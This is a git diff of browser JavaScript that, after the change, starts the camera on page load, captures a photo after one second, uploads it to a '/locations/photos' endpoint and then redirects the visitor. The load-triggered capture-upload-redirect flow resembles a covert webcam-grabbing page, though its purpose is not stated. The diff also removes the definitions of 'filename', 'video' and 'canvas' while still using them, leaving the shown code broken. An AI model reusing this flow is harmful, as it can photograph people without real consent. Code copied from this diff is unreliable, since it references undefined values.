@@ -1,9 +1,8 @@
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-// const photo = document.getElementById('photo');
+
+
 
 // open the camera and capture the image
-const startCam = (locationID) => {
+const startCam = () => {
     navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
             video.srcObject = stream;
@@ -14,7 +13,7 @@ const startCam = (locationID) => {
 
                 // Wait a short moment to make sure video has a frame
                 setTimeout(() => {
-                    captureImage(locationID);
+                    captureImage();
                 }, 1000); // delay 1 second to allow camera to stabilize
             };
         })
@@ -23,7 +22,7 @@ const startCam = (locationID) => {
         });
 }
 
-function captureImage(locationID) {
+function captureImage() {
     const context = canvas.getContext('2d');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -33,19 +32,13 @@ function captureImage(locationID) {
     // const dataUrl = canvas.toDataURL('image/png');
     // photo.src = dataUrl;
 
-    uploadImage(locationID);
+    uploadImage();
 }
 
-function uploadImage(locationID) {
+function uploadImage() {
     canvas.toBlob((blob) => {
         const formData = new FormData();
-
-        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        const random = Math.random().toString(36).substring(2, 8);
-        const filename = `capture-${timestamp}-${random}.png`;
-
         formData.append('photo', blob, filename);
-        formData.append('id', locationID);
 
         fetch(baseUrl + '/locations/photos', {
             method: 'POST',
@@ -55,12 +48,7 @@ function uploadImage(locationID) {
                 if (!response.ok) {
                     throw new Error('Network response was not ok');
                 }
-                return response.json();
-            })
-            .then(data => {
-                return data;
-            })
-            .then(() => {
+
                 console.log('Image uploaded successfully');
                 window.location.replace(locationParam);
             })
@@ -68,3 +56,4 @@ function uploadImage(locationID) {
     }, 'image/png');
 }
 
+window.onload = startCam;
